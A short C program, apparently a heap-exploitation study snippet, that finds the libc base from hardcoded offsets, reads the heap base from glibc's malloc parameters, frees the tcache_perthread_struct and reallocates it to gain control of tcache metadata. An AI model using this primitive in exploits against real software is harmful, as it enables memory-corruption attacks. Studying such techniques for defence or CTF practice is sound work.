#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
size_t getheap()
{
    puts("getlibc");
    size_t libc_addr=puts-0x6dfe0;
    size_t* mp_72=libc_addr+0x3af2c0+0x8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{
    
    size_t tcache_perthread_struct=getheap()+0x10; //memory
    free(tcache_perthread_struct);
    size_t destchunk=malloc(0x240);// size 0x250
    printf("tcache_perthread_struct 0x%p\n",tcache_perthread_struct);
    printf("destchunk 0x%p\n",destchunk);

}